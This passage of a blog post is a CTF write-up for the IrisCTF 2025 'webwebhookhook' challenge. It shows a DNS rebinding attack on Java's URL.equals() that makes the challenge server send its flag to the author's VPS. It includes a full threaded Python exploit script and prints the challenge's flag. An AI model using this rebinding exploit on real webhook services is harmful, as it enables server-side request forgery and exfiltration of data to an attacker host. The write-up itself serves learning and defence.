note over ChallengeServer: 1) the server code uses<br>URL.equals() to compare<br>‚Äúxxxx.rbndr.us‚Äù vs ‚Äúexample.org‚Äù
ChallengeServer->>DNS: DNS Query A for xxxx.rbndr.us
note over DNS: 2) DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
DNS-->>ChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 93.184.215.14
note over ChallengeServer: 3) URL.equals() returns true<br>because IP matches example.org<br>note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP)
note over ChallengeServer: 4) hook.openConnection()<br>where hook=xxxx.rbndr.us<br>ChallengeServer->>DNS: DNS Query A for xxxx.rbndr.us
note over DNS: 5) DNS A Record is 83.130.170.16, TTL=1 (attacker IP)<br>DNS ‚Äúrebinding‚Äù event, xxxx.rbndr.us is resolving to Attacker's IP
DNS-->>ChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 83.130.170.16
note over ChallengeServer: 5) Opens HTTP connection to 83.130.170.16
note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
note over DNS: ...
ChallengeServer->>Attacker: POST to 83.130.170.16<br>{"flag":"irisctf{...}"}
Attacker-->>Attacker: Captures the flag (win)</div></div><p>A trick I used to increase my chances of hitting the exact window between <strong>Step 1</strong> and <strong>Step 4</strong> was to send a large payload in the body to be processed, so that <strong>L34</strong> would have a slightly longer execution time to give us the possibility of hitting the cache revalidation switch in a larger window.</p><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span></span><span class=dark:text-neutral-300><strong>NOTE</strong><br>An interesting rabbit hole would be to understand how <code>String.replace()</code> is performed internally by Java/Kotlin, since there could be the possibility of using some classic ReDoS tricks to increase the execution time of <code>h.template.replace("_DATA_", body)</code> even more.</span></div><h2 class="relative group">Exploitation (cry and pray)<div id=exploitation-cry-and-pray class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#exploitation-cry-and-pray aria-label=Anchor>#</a></span></h2><p>Having gathered all the elements to exploit, I proceeded to write the following python script:</p><p><strong>exploit.py</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>concurrent.futures</span> <span class=kn>import</span> <span class=n>ThreadPoolExecutor</span><span class=p>,</span> <span class=n>as_completed</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>RBNDR</span> <span class=o>=</span> <span class=s2>&#34;http://5db8d70e.5e82aa10.rbndr.us&#34;</span>
</span></span><span class=line><span class=cl><span class=n>CHALL_URL</span> <span class=o>=</span> <span class=s2>&#34;https://webwebhookhook-43435a7246999280.i.chal.irisc.tf&#34;</span>
</span></span><span class=line><span class=cl><span class=n>BATCH_SIZE</span> <span class=o>=</span> <span class=mi>20</span>
</span></span><span class=line><span class=cl><span class=n>DELAY_BETWEEN_BATCHES</span> <span class=o>=</span> <span class=mf>0.1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>req_id</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>req_id_lock</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Lock</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_request</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>req_id</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span><span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>},</span> <span class=n>data</span><span class=o>=</span><span class=n>payload</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>req_id_lock</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>req_id</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>current_id</span> <span class=o>=</span> <span class=n>req_id</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>current_id</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=si>}</span><span class=s2> </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>req_id_lock</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>req_id</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>current_id</span> <span class=o>=</span> <span class=n>req_id</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>current_id</span><span class=si>}</span><span class=s2> Error: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>CHALL_URL</span><span class=si>}</span><span class=s2>/webhook?hook=</span><span class=si>{</span><span class=n>RBNDR</span><span class=si>}</span><span class=s2>/admin&#34;</span> <span class=c1># we need to also match url path </span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>1000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span> <span class=k>as</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>ThreadPoolExecutor</span><span class=p>(</span><span class=n>max_workers</span><span class=o>=</span><span class=n>BATCH_SIZE</span><span class=p>)</span> <span class=k>as</span> <span class=n>executor</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>futures</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>                    <span class=n>executor</span><span class=o>.</span><span class=n>submit</span><span class=p>(</span><span class=n>send_request</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>BATCH_SIZE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>future</span> <span class=ow>in</span> <span class=n>as_completed</span><span class=p>(</span><span class=n>futures</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=k>pass</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=n>DELAY_BETWEEN_BATCHES</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><p>A little bit of explanation for it:</p><ul><li>The <code>RBNDR</code> url was constructed with a <a href=https://lock.cmpxchg8b.com/rebinder.html target=_blank>rebinder service</a> using the <code>example.com</code> IP as the first IP and my VPS IP as the second IP.</li><li>I opted for a requests batched approach to have an high density of requests in a short time window.</li><li>Large body payload to increase the execution time of <code>h.template.replace("_DATA_", body)</code> and thus increasing the duration of the target window.</li><li>Spamming the <code>/webhook</code> to have different DNS cache revalidation timings and increase the chances of an IP switch happening inside the target window.</li></ul><p>So, at this point i just run the exploit, prayed and went to have lunch, aaand when i got back i saw this in my VPS console output</p><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/flag.png alt="Request with the flag received on the VPS"><figcaption>Request with the flag received on the VPS</figcaption></figure></p><h2 class="relative group">Extra<div id=extra class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#extra aria-label=Anchor>#</a></span></h2><h3 class="relative group">But why the hell does Java do DNS resolutions on simple <code>==</code> comparisons?<div id=but-why-the-hell-does-java-do-dns-resolutions-on-simple--comparisons class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#but-why-the-hell-does-java-do-dns-resolutions-on-simple--comparisons aria-label=Anchor>#</a></span></h3><p>While many weird Java behaviors could be simply explained with the phrase <em>&ldquo;because Java.&rdquo;</em> I wanted to try to justify why the Java devs choose to do DNS resolutions on simple equal comparisons.<br>Let&rsquo;s start from the fact that mainly in Java everything is an object allocated in the heap, except for primitives like <code>int</code>, <code>char</code>, <code>byte</code>, <code>long</code>, <code>String</code> and a few more. Therefore when the JVM has to do comparison of two objects, to see if those two objects are equal, it must check that they are equal in every way. In fact, if you create two objects of two identical classes, their comparison will return false because they have different references in memory.<br>As a result Java devs probably said something like <em>&ldquo;you don&rsquo;t like it? jk what? Implement the damn comparison by yourself&rdquo;</em>. So practically every object in Java has its own magic method <code>.equals()</code> which corresponds to its custom implementation to do more intelligent checks and not make two objects have to be just two deep copies to be equal.<br>Whoever wrote the <code>URL</code> class thought well that to effectively check that two URL objects are equal, they not only must have every property in common (path, protocol, port, &mldr;) but must also resolve to the same IP. To find out this, obviously Java needs to perform a DNS resolution.<br>Questionable choice? Absolutely.<br>This is what it is anyway? Yes and we have to live with it and in case we simply want to compare two URLs as strings we should use the <code>URI</code> class.</p><p><strong>Fun Fact</strong>: as someone said in this not so happy discussion about this behavior <a href="https://news.ycombinator.com/item?id=21765788" target=_blank>here</a>, that choice was originally made to prevent DNS rebinding attacks.</p><hr><p>Flag: <code>irisctf{url_equals_rebind}</code></p></div></div><script>var oid="views_posts/IrisCTF-2025/webwebhookhook/index.md",oid_likes="likes_posts/IrisCTF-2025/webwebhookhook/index.md"</script><script type=text/javascript src=/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q+oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script></section><footer class="pt-8 max-w-prose print:hidden"></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/tags/ title=Tags>Tags</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
simonedimaria</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]" data-url=https://simonedimaria.github.io/ style=z-index:500><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>